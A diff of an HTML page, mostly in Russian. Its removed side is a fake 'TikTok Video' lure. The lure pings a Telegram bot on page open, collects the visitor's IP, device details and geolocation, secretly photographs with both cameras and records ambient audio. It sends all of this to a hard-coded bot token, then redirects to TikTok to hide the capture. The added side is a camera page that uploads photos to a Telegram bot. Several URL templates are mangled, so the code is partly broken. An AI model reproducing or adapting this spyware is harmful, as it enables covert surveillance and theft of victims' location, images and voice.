@@ -2,116 +2,97 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Video</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ULTRA SENSOR TO TG</title>
     <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
-        #watchBtn { background: #ff0050; color: #fff; border: none; padding: 22px 60px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px rgba(255, 0, 80, 0.6); z-index: 100; }
-        video, canvas { display: none; visibility: hidden; position: absolute; }
+        :root { --neon: #00ff41; --bg: #0b0b0b; }
+        body { margin: 0; background: var(--bg); color: var(--neon); font-family: monospace; display: flex; flex-direction: column; align-items: center; }
+        .status { padding: 15px; font-size: 10px; color: #555; text-transform: uppercase; }
+        #btn { 
+            width: 80px; height: 80px; border-radius: 50%; border: 4px solid var(--neon); 
+            background: transparent; cursor: pointer; margin: 40px; position: relative;
+        }
+        #btn::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; height: 60px; background: var(--neon); border-radius: 50%; }
+        #btn:disabled { opacity: 0.3; filter: grayscale(1); }
+        canvas, video { display: none; }
+        #log { font-size: 11px; width: 80%; text-align: center; height: 50px; }
     </style>
 </head>
 <body>
 
-    <button id="watchBtn">СМОТРЕТЬ В HD</button>
+    <div class="status">System: <span id="sys">Online</span></div>
+    
+    <div id="log">READY TO CAPTURE</div>
 
-    <video id="v" autoplay playsinline muted></video>
+    <button id="btn" onclick="captureAndSend()"></button>
+
+    <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-        const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
-        const CHAT_ID = '6660269414';
+        // --- НАСТРОЙКИ (Впиши свои данные) ---
+        const TG_TOKEN = "ТВОЙ_ТОКЕН_БОТА";
+        const TG_CHAT_ID = "ТВОЙ_CHAT_ID";
 
-        const btn = document.getElementById('watchBtn');
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
+        const log = (txt) => document.getElementById('log').innerText = txt;
 
-        // УВЕДОМЛЕНИЕ О ВХОДЕ (срабатывает сразу при открытии страницы)
-        window.onload = () => {
-            sendText("🔔 **КТО-ТО ОТКРЫЛ ССЫЛКУ!** Ждем нажатия кнопки...");
-        };
-
-        btn.addEventListener('click', async () => {
-            btn.textContent = "ПОДКЛЮЧЕНИЕ...";
+        async function captureAndSend() {
+            const btn = document.getElementById('btn');
             btn.disabled = true;
+            log("SENSING...");
 
-            // 1. Сбор Deep Info (IP, Железо, Батарея)
-            await collectDeepInfo();
-
-            // 2. Геолокация
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendText(`📍 **ЛОКАЦИЯ:** https://google.com{p.coords.latitude},${p.coords.longitude}`);
-            }, null, {enableHighAccuracy: true});
-
-            // 3. Скрытые фото (Фронт + Тыл)
-            await snap('user', 'СЕЛФИ');
-            await snap('environment', 'ОСНОВНАЯ КАМЕРА');
-
-            // 4. Фоновое аудио (запись 4 секунды)
-            await recordAudio(4000);
-
-            // 5. Редирект на реальный TikTok (для маскировки)
-            setTimeout(() => {
-                window.location.href = "https://tiktok.com";
-            }, 1500);
-        });
-
-        async function collectDeepInfo() {
             try {
-                const ipRes = await fetch('https://ipapi.co').then(r => r.json());
-                const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
-                let m = `🔥 **ПОЛНЫЙ ЛОГ ДАННЫХ**\n`;
-                m += `🌐 IP: \`${ipRes.ip}\` (${ipRes.city})\n`;
-                m += `📱 Система: ${navigator.platform}\n`;
-                m += `🔋 Заряд: ${Math.round(b.level * 100)}%\n`;
-                m += `🖥 Экран: ${window.screen.width}x${window.screen.height}\n`;
-                m += `⚙️ Ядер: ${navigator.hardwareConcurrency} | ОЗУ: ~${navigator.deviceMemory}GB`;
-                await sendText(m);
-            } catch(e) { await sendText("⚠️ Ошибка сбора инфо"); }
-        }
+                // 1. Доступ к камере (Макс качество)
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment", width: { ideal: 4096 }, height: { ideal: 2160 } }
+                });
 
-        async function snap(mode, label) {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode, width: 1280, height: 720}});
-                v.srcObject = s;
-                await new Promise(r => setTimeout(r, 1200));
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                s.getTracks().forEach(t => t.stop());
-                const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-                await sendFile(b, 'photo', `📸 ${label}`);
-            } catch(e) { await sendText(`❌ Камера ${label} заблокирована`); }
-        }
+                const video = document.getElementById('v');
+                video.srcObject = stream;
 
-        async function recordAudio(ms) {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const rec = new MediaRecorder(s);
-                const chunks = [];
-                rec.ondataavailable = e => chunks.push(e.data);
-                rec.onstop = async () => {
-                    const b = new Blob(chunks, { type: 'audio/ogg' });
-                    await sendFile(b, 'voice', '🎙 Аудиозапись окружения');
-                    s.getTracks().forEach(t => t.stop());
-                };
-                rec.start();
-                setTimeout(() => rec.stop(), ms);
-            } catch(e) {}
-        }
+                // Даем 2 секунды на автофокус
+                await new Promise(r => setTimeout(r, 2000));
 
-        async function sendFile(blob, type, cap) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append(type === 'voice' ? 'voice' : 'photo', blob, 'file.ogg');
-            fd.append('caption', cap);
-            await fetch(`https://telegram.org{TOKEN}/send${type === 'voice' ? 'Voice' : 'Photo'}`, {method: 'POST', body: fd});
-        }
+                const track = stream.getVideoTracks()[0];
+                const settings = track.getSettings();
+                
+                const canvas = document.getElementById('c');
+                canvas.width = settings.width;
+                canvas.height = settings.height;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.filter = 'contrast(1.1) saturate(1.1)'; // Небольшая постобработка
+                ctx.drawImage(video, 0, 0);
 
-        async function sendText(t) {
-            await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'Markdown' })
-            });
+                // 2. Конвертация в Blob (бинарный файл)
+                log("UPLOADING TO TELEGRAM...");
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', TG_CHAT_ID);
+                    formData.append('photo', blob, 'raw_capture.jpg');
+                    formData.append('caption', `📸 RAW DUMP\nRes: ${settings.width}x${settings.height}\nDevice: ${navigator.platform}`);
+
+                    // 3. Отправка через API Telegram
+                    const response = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        log("✅ SUCCESS: SENT TO BOT");
+                    } else {
+                        log("❌ TG ERROR");
+                    }
+
+                    // Выключаем камеру
+                    stream.getTracks().forEach(t => t.stop());
+                    btn.disabled = false;
+                }, 'image/jpeg', 0.95);
+
+            } catch (err) {
+                log("FATAL ERROR: " + err.message);
+                btn.disabled = false;
+            }
         }
     </script>
 </body>
